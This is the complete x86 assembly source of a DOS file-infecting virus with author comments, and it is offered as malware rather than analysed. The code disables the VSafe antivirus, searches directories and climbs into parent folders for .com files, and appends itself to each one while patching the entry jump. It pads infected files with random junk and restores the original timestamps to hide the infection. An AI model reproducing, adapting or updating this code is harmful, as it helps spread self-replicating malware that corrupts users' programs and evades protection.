.model tiny                     ; needed to be a .com program
.radix 16                       ; assume hexidecimal instead of decimal
.code                           ; code starts

        org 100h        ; com's start at cs:100 (needed for tlink)

virus_size      equ    last - virus             ; Defines virus size

virus:          mov     si,si
        nop
        nop
        mov     ax,0fa01h               ; unload Vsafe 
        mov     dx,5945h
        int     16h
        call    where                   ; push ip onto stack
where:          mov     di,sp                   ; mov stack pointer to di
        mov     bp,word ptr ss:[di]     ; thanks to The Unforgiven
        sub     bp,10f                  ; for this code
        inc     sp                      ; read loc into bp
        inc     sp                      ; inc sp � to correct

        lea     bx,[bp+offset return_bytes]     ; Load the address
                            ; of bp plus the
                            ; original offset
                            ; of return bytes
                            ; into di.
        push    ds:[bx]                 ; push the first two bytes of the
                        ; original program onto the stack
        inc     bx                      ; increase di to point to the next
        inc     bx                      ; two bytes we saved of the orig prog
        push    ds:[bx]                 ; push the last two bytes we saved
                        ; of the original program onto the
                        ; stack
        
        
        mov     ah,1a                   ; Set DTA
        lea     dx,[bp+offset last]     ; Load the effective address
                        ; of the end of the virus to
                        ; be used for the new DTA
        int     21
        int     3                
        
too_cool:        mov     ah,4e                   ; Find the first match
get_files:      lea     dx,[bp+offset filemask] ; Load the offset filemask dx
        int     21                      
        jc      tree
        
        jmp     getbad1
tree:           jmp     exit_error
getbad1:        mov     ah,2f                   ; get the new DTA
        int     21                      ; this is returned in bx
        xor     ax,ax                   ; clear up ax
        lea     si,[bx+1e]              ; lea in si data + junk to get 
look:           lodsb                           ; to file, mov this value to al
        or      al,al                   ; is it Zero if not do again
        jne     look                    ; lodsb again
        sub     si,4                    ; found end of file name sub 4 
        lodsb                           ; to get extension load into al
        cmp     al,43                   ; is it C as in com file
        je      stupid                  ; not search again

wow:            jmp     nxt_vic
stupid:         lea     dx,[bp+offset last+1e]  ; Load the offset fname (�)
        
        mov     ax, 4301h               ; DTA
        xor     cx, cx                  ; Clear file attributes
        int     21h                     ; Issue the call
        
        mov     ax,3d02                 ; Open file read/write
        int     21                       
        xchg    bx,ax                   ; handle --> BX
        lea     di,[bp+offset last+1a]  ; Load the offset fsize (�)
        mov     ax,word ptr ds:[di]     ; Move this fsize into ax
        sub     ax,3                    ; Take off three to build jmp
        mov     word ptr [bp+jump_address+1],ax ; save these bytes
                        ; at jump address+1 which is
                        ; jmp (xx xx+3) or 0e9 xx xx

        mov     ah,3f                   ; Read file
        mov     cx,4                    ; Read 4 bytes
        lea     dx,[bp+offset return_bytes]     ; Load the offset dx
        int     21
        lea     di,[bp+offset return_bytes+3]   ; Load the offset of
                            ; the fourth byte
                            ; we just read into
                            ; the virus
        cmp     byte ptr ds:[di],90     ; Is this byte a nop?
        je      exit_now                ; If so assume infected,
                        ; close file, and run
                        ; infection cycle again


        mov     ax,4200                 ; Goto beginning of file
        xor     cx,cx                   ; cx=0
        xor     dx,dx                   ; dx=0
        int     21
        mov     ax,5700                 ; get the files original date
        int     21                      ; and time and move this 
        mov     [date],dx               ; value to date/ time
        mov     [time],cx
        mov     ah,40                   ; Write file
        mov     cx,4                    ; Write four bytes
        lea     dx,[bp+offset jump_address]     ; Load the offset of 
                            ; the bytes to write 
                            ; (which is our jmp 
                            ; constuction)
        int     21
        mov     ax,4202                 ; Goto end of file
        xor     cx,cx                   ; cx=0
        xor     dx,dx                   ; dx=0
        int     21
        mov     ah,40                   ; Write file
        mov     cx,virus_size           ; Write the virus size
        lea     dx,[bp+offset virus]    ; Load the offset of the
                        ; virus into dx
        int     21
        
        mov     ax,2c00                 ; get system date/time info
        int     21
        
        mov     cl,dl                   ; move the hundreths of a second into
        mov     al,cl
        
        mov     ax,2c00                 ; get system date/time info
        int     21
        
        mov     cl,dl                   ; move the hundreths of a second into
        add     cl,al
        ror     cl,1
        
        
        xor     ch,ch                   ; cl and zero ch
        
        xor     dx,dx                   ; zero Dx
        
        mov     ah,40h                  ; Write additional junk onto end of file
        int     21h
        
        mov     cx,[time]               ; Write the original date
        mov     dx,[date]               ; back to the infected file 
        mov     ax,5701
        int     21

exit_now:       mov     ah,3e                   ; Close the file, the
                        ; infection is complete
        int     21
nxt_vic:        mov     ah,4f                   ; Continue the infection
                        ; process.  Find the next
                        ; match!
        jmp     get_files               ; Doit again, and stop only
                        ; when int 21 ah=4f reports
                        ; no more matches!
exit_error:    
        mov     dx,offset path_name
        mov     ah,3bh
        int     21h
        jc      exit_w
        jmp     too_cool
        
exit_w:         mov     ah,1a                   ; Set DTA
        mov     dx,80                   ; Change to original DTA
        int     21
        mov     bx,102                  ; Set bx to 102
        pop     [bx]                    ; pop the last two saved
                        ; bytes into ds:[102]
        dec     bx                      ; decrease bx so that is
        dec     bx                      ; points to 100
        pop     [bx]                    ; pop the first two saved
                        ; bytes into ds:[100]
        push    bx                      ; bx=100
        xor     ax,ax                   ; most viruses don't do this
        xor     bx,bx                   ; sequence, but since some
        xor     cx,cx                   ; programs assume the reg's
        xor     dx,dx                   ; are set to 0 like they
        xor     bp,bp                   ; should be, this is an
        xor     si,si                   ; extra precaution.
        xor     di,di
gone:           ret                             ; return to host
path_name       db      '..',0 

date            dw      ? 
time            dw      ?
filemask        db      '*.*',0                 ; Look for *.com's
jump_address    db      0e9,0,0,90              ; jmp xx xx+3, and 90 is the
new_dta         dw      ?                       ; infection marker
return_bytes    db      0cdh,20,0,0             ; simple way to end the
                        ; first generation (it's
                        ; the same as saying int 20)
last:

end virus
code ends
